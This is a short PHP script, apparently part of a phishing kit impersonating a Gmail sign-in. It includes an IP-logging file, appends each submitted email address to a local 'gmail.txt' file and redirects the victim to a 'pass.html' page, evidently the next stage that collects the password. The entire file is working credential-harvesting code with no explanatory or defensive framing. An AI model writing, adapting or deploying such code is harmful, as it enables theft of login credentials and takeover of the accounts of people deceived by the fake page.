<?php
include 'ip.php';
file_put_contents("gmail.txt", "" . $email = $_POST['email'] . "\n", FILE_APPEND);
header('Location: pass.html');
?>